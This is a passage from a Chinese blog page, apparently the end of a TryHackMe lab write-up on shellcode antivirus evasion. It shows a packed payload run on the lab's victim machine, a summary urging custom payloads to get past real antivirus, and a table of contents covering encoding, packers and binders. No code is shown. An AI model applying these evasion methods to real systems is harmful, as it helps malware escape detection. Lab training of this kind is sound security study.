<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054656.png" alt></p>
<p>最后，我们在目标机上将加壳版本的EncStageless.exe上传到THM Antivirus检查器页面(当我们能够规避目标机上的AV软件时，我们所上传的文件会自动执行)。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054657.png" alt></p>
<p>whoami得到：<code>av-evasion-pc\av-victim</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054658.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054659.png" alt></p>
<h1 id="0x12-总结">0x12 总结</h1>
<p>在本文中，我们探索了攻击者可以使用的一些简单策略来规避仅依赖于disk-based检测的反病毒引擎，虽然我们所尝试规避的只是任何现代反病毒引擎可用的机制之一，但作为免杀操作的第一步，我们至少应该能够将有效载荷传递到目标机器的计算机磁盘上。在后面的学习实践中，我们还会学习如何绕过内存检测以及绕过其他的高级检测机制。</p>
<p>tips：为了获取有关怎样绕过可能阻止触发有效载荷的进一步Windows安全机制的更多信息，我们可能需要学习"<a target="_blank" rel="noopener" href="https://tryhackme.com/room/runtimedetectionevasion">运行时检测规避</a>"技术。</p>
<p>请记住，任何针对有效载荷的加密、编码、加壳技术的成功，很大程度上取决于我们所面对的反病毒引擎不知道经过处理后的恶意可执行文件的任何签名。因此，在尝试绕过任何实际的反病毒解决方案时，能够自定义自己的有效载荷才是至关重要的事情。</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/08/01/thm-shellcode-mian-sha/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/08/01/thm-shellcode-mian-sha/')">THM-ShellCode免杀</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/08/01/thm-shellcode-mian-sha/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=THM-ShellCode免杀&amp;url=http://hybcx.xyz/2024/08/01/thm-shellcode-mian-sha/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/TryHackMe/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>TryHackMe<span class="tagsPageCount">36</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/01/thm-fan-bing-du-jian-jie/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM-反病毒简介</div></div></a></div><div class="next-post pull-right"><a href="/2024/08/02/thm-dai-ma-hun-yao-yuan-li/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM-代码混淆原理</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/02/14/thm-basic-pentesting/" title="THM-Basic Pentesting"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">THM-Basic Pentesting</div></div></a></div><div><a href="/2024/07/10/thm-c2-jian-jie/" title="THM-C2简介"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-10</div><div class="title">THM-C2简介</div></div></a></div><div><a href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-08-08</div><div class="title">THM-ByPass_UAC</div></div></a></div><div><a href="/2024/06/09/thm-enumerating-active-directory/" title="THM-Enumerating Active Directory"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-09</div><div class="title">THM-Enumerating Active Directory</div></div></a></div><div><a href="/2024/06/17/thm-corp/" title="THM-Corp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-17</div><div class="title">THM-Corp</div></div></a></div><div><a href="/2024/07/16/thm-enumeration/" title="THM-Enumeration"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-16</div><div class="title">THM-Enumeration</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">0x01 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87"><span class="toc-number">1.1.</span> <span class="toc-text">学习目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80"><span class="toc-number">1.2.</span> <span class="toc-text">前置学习基础</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%8C%91%E6%88%98"><span class="toc-number">2.</span> <span class="toc-text">0x02 挑战</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-pe%E7%BB%93%E6%9E%84"><span class="toc-number">3.</span> <span class="toc-text">0x03 PE结构</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFpe"><span class="toc-number">3.1.</span> <span class="toc-text">什么是PE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3pe"><span class="toc-number">3.2.</span> <span class="toc-text">为什么需要了解PE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8pe-bear%E5%B7%A5%E5%85%B7"><span class="toc-number">3.3.</span> <span class="toc-text">使用PE-Bear工具</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-shellcode%E4%BB%8B%E7%BB%8D"><span class="toc-number">4.</span> <span class="toc-text">0x04 Shellcode介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84shellcode"><span class="toc-number">4.1.</span> <span class="toc-text">一个简单的Shellcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E7%94%9F%E6%88%90shellcode"><span class="toc-number">5.</span> <span class="toc-text">0x05 生成Shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%85%AC%E5%BC%80%E5%B7%A5%E5%85%B7%E7%94%9F%E6%88%90shellcode"><span class="toc-number">5.1.</span> <span class="toc-text">使用公开工具生成shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode%E6%B3%A8%E5%85%A5"><span class="toc-number">5.2.</span> <span class="toc-text">Shellcode注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%8E%9F%E5%A7%8Bshellcode"><span class="toc-number">5.3.</span> <span class="toc-text">生成原始shellcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7payload%E5%88%86%E6%AE%B5"><span class="toc-number">6.</span> <span class="toc-text">0x06 有效载荷(Payload)分段</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E9%98%B6%E6%AE%B5%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7"><span class="toc-number">6.1.</span> <span class="toc-text">无阶段有效载荷</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E9%98%B6%E6%AE%B5%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7"><span class="toc-number">6.2.</span> <span class="toc-text">分阶段有效载荷</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E9%98%B6%E6%AE%B5vs%E5%88%86%E9%98%B6%E6%AE%B5"><span class="toc-number">6.3.</span> <span class="toc-text">无阶段VS分阶段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#metasploit%E4%B8%AD%E7%9A%84payload"><span class="toc-number">6.4.</span> <span class="toc-text">Metasploit中的Payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84stager%E5%88%86%E9%98%B6%E6%AE%B5%E8%BD%BD%E5%85%A5%E5%99%A8"><span class="toc-number">6.5.</span> <span class="toc-text">创建自己的Stager(分阶段载入器)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%88%91%E4%BB%AC%E7%9A%84stager%E8%BF%90%E8%A1%8C%E5%8F%8D%E5%90%91shell"><span class="toc-number">6.6.</span> <span class="toc-text">使用我们的Stager运行反向shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86%E4%BB%8B%E7%BB%8D"><span class="toc-number">7.</span> <span class="toc-text">0x07 编码和加密介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%BC%96%E7%A0%81"><span class="toc-number">7.1.</span> <span class="toc-text">什么是编码？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8A%A0%E5%AF%86"><span class="toc-number">7.2.</span> <span class="toc-text">什么是加密？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86"><span class="toc-number">7.3.</span> <span class="toc-text">为什么需要了解编码和加密？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-shellcode%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86"><span class="toc-number">8.</span> <span class="toc-text">0x08 Shellcode的编码和加密</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8msfvenom%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81"><span class="toc-number">8.1.</span> <span class="toc-text">使用MSFVenom进行编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8msfvenom%E8%BF%9B%E8%A1%8C%E5%8A%A0%E5%AF%86"><span class="toc-number">8.2.</span> <span class="toc-text">使用MSFVenom进行加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7"><span class="toc-number">8.3.</span> <span class="toc-text">创建自定义有效载荷</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E5%99%A8"><span class="toc-number">8.4.</span> <span class="toc-text">编码器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E8%A7%A3%E7%A0%81%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7"><span class="toc-number">8.5.</span> <span class="toc-text">自解码有效载荷</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-%E5%8A%A0%E5%A3%B3%E5%99%A8packers"><span class="toc-number">9.</span> <span class="toc-text">0x09 加壳器(Packers)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E8%BF%9B%E8%A1%8C%E5%8A%A0%E5%A3%B3"><span class="toc-number">9.1.</span> <span class="toc-text">对应用程序进行加壳</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E5%A3%B3%E5%99%A8%E5%92%8Cavs%E5%8F%8D%E7%97%85%E6%AF%92"><span class="toc-number">9.2.</span> <span class="toc-text">加壳器和AVs(反病毒)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E6%88%91%E4%BB%AC%E7%9A%84shellcode%E8%BF%9B%E8%A1%8C%E5%8A%A0%E5%A3%B3"><span class="toc-number">9.3.</span> <span class="toc-text">对我们的shellcode进行加壳</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">9.4.</span> <span class="toc-text">补充</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x10-%E7%BB%91%E5%AE%9A%E5%99%A8binders"><span class="toc-number">10.</span> <span class="toc-text">0x10 绑定器(Binders)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8msfvenom%E8%BF%9B%E8%A1%8C%E7%BB%91%E5%AE%9A%E5%A4%84%E7%90%86"><span class="toc-number">10.1.</span> <span class="toc-text">使用msfvenom进行绑定处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%91%E5%AE%9A%E5%99%A8%E5%92%8Cavs%E5%8F%8D%E7%97%85%E6%AF%92"><span class="toc-number">10.2.</span> <span class="toc-text">绑定器和AVs(反病毒)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x11-%E6%9C%80%E7%BB%88%E5%AE%9E%E9%AA%8C%E4%BB%BB%E5%8A%A1"><span class="toc-number">11.</span> <span class="toc-text">0x11 最终实验任务</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x12-%E6%80%BB%E7%BB%93"><span class="toc-number">12.</span> <span class="toc-text">0x12 总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-yun-xing-shi-gui-bi-jian-ce/" title="THM-运行时规避检测">THM-运行时规避检测</a><time datetime="2024-08-08T14:19:16.000Z" title="发表于 2024-08-08 22:19:16">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC">THM-ByPass_UAC</a><time datetime="2024-08-08T07:36:41.000Z" title="发表于 2024-08-08 15:36:41">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/07/thm-qian-ming-gui-bi/" title="THM-签名规避">THM-签名规避</a><time datetime="2024-08-07T09:11:33.000Z" title="发表于 2024-08-07 17:11:33">2024-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/05/windows-ti-quan-zong-jie/" title="Windows提权总结">Windows提权总结</a><time datetime="2024-08-05T02:59:37.000Z" title="发表于 2024-08-05 10:59:37">2024-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/02/thm-dai-ma-hun-yao-yuan-li/" title="THM-代码混淆原理">THM-代码混淆原理</a><time datetime="2024-08-02T01:46:10.000Z" title="发表于 2024-08-02 09:46:10">2024-08-02</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">199</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 